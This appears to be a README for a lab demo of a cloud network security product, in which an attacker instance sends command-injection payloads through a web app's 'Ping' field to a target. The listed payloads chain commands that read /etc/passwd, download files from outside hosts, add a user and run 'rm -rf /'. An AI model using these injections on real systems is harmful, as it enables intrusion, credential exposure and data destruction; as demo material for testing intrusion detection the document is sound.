# Cloud One - Network Security Demo
Requirements:

-- AWS Account
-- NSVA Deployment (Terraform)
-- 2 Ubuntu Linux Instances
-- 1 Windows Instance

## Phase1 - Demo Preparation
- Create 2 new Linux Instances;
- The attacker instance must be placed in the same subnet of the bastion machine;
- The target instance must be placed in the workload subnet;
- On the Advanced Options field, paste the script attacker.sh and target.sh (1 script in each instance);

## Phase2 - Testing the Demo
- Connect on the Linux Instance where you executed the attacker script through http://public-ip

-- username: administrator 
-- password: password

- Connect on the Linux Instance where you executed the target script through http://private-ip (from the windows instance)

## Phase3 - Executing the Demo
- Command Injection Menu
-- Use the "Ping" field to execute the attacks below:
- 127.0.0.1| python exploit.py http://target-ip/hello "curl target-ip"
- 127.0.0.1| python exploit.py http://target-ip/hello "ls -la"
- 127.0.0.1| python exploit.py http://target-ip/hello "cat /etc/passwd"
- 127.0.0.1| python exploit.py http://target-ip/hello "wget http://2016.eicar.org/download/eicar.com"
- 127.0.0.1| python exploit.py http://target-ip/hello "curl http://wrs21.winshipway.com/"
- 127.0.0.1| python exploit.py http://target-ip/hello "adduser YouHaveBeenPwned"
- 127.0.0.1| python exploit.py http://target-ip/hello "ls -la"
- 127.0.0.1| python exploit.py http://target-ip/hello "rm -rf /"

## Phase3 - SMS/C1NS Logs
Check the logs

.

